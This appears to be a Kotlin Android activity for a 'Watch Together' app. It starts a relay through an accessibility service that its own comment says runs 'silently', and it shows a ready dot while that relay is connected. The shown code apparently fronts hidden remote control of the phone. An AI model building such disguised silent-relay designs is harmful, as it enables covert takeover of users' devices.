package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import androidx.appcompat.app.AppCompatActivity

/** Minimal Watch Together home — backend runs silently via accessibility service. */
class HomeActivity : AppCompatActivity() {

    private var readyDot: View? = null
    private val handler = Handler(Looper.getMainLooper())
    private val refresh = object : Runnable {
        override fun run() {
            updateReadyDot()
            handler.postDelayed(this, 5000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_home)
        readyDot = findViewById(R.id.readyDot)
        TouchAccessibilityService.instance?.ensureRelay()
    }

    override fun onResume() {
        super.onResume()
        if (!WatchSync.isEnabled(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }
        updateReadyDot()
        handler.post(refresh)
    }

    override fun onPause() {
        handler.removeCallbacks(refresh)
        super.onPause()
    }

    private fun updateReadyDot() {
        val ready = WatchSync.isEnabled(this) && RelayHub.relayConnected
        readyDot?.visibility = if (ready) View.VISIBLE else View.INVISIBLE
    }
}
